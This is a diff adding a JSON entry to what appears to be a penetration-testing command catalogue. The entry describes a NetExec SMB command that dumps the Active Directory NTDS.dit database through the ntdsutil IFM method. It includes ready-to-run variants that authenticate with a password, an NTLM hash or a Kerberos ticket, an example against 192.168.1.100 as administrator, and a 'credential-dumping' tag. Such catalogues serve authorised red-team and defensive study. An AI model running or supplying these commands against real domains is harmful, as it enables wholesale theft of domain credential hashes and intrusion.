@@ -1,0 +1,36 @@
+{
+  "id": "nxc-smb-ntdsutil",
+  "name": "NetExec SMB NTDSUtil Dump",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M ntdsutil",
+  "description": "Dump NTDS.dit using ntdsutil IFM method (creates install-from-media backup)",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "ntdsutil",
+    "ntds",
+    "credential-dumping",
+    "ifm"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M ntdsutil"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "nxc smb '<ip>' -u '<user>' --use-kcache -M ntdsutil"
+    }
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'administrator' -p 'password' -M ntdsutil"
+  ]
+}
